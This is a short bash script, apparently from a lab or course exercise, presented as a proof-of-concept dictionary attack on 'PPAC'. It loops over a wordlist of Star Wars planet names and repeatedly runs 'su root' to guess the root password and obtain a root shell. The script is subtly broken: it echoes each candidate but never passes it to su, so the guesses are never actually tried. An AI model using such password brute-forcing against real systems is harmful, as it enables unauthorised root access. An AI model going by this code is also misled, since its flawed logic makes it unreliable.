#! /usr/bin/env bash
# The dictionary attack poc-exploit

echo -e "\n>>>>>Starting <dictionaryAttack>: a poc-exploit for <PPAC>:\n"

#loading the dictionary
dictFile="starWarsPlanets.dict"
if [ ! -f $dictFile ]; then
	echo "Error in $0: Cannot find <$dictFile>."
	exit 1
fi
StarWarsPlanetsDict=$(cat $dictFile)

#try to attack
for planet in $StarWarsPlanetsDict; do
	echo ">> Trying <$planet>..."
	echo ">> su root"
	su root > rootShell.out
	if [ $(wc -l <rootShell.out) -gt 0 ]; then break; fi
done

echo -e "\n>>>>>End of <dictionaryAttack>: a poc-exploit for <PPAC>.\n"
